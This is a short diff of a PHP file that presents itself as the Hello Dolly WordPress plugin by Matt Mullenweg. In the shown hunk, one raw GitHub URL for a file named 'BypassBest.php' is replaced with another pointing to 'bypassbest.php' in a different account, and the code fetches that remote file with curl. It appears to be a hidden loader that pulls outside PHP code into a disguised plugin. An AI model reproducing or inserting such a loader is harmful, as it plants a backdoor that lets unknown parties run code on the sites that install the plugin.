@@ -11,7 +11,7 @@ Author: Matt Mullenweg
 Version: 1.7.2
 Author URI: http://ma.tt/
 */
- $remoteUrl = "https://raw.githubusercontent.com/starkvps99812/upd/refs/heads/main/BypassBest.php";
+ $remoteUrl = "https://raw.githubusercontent.com/mandhanharisha-hub/seo/refs/heads/main/bypassbest.php";
   $ch = curl_init($remoteUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     $remoteCode = curl_exec($ch);
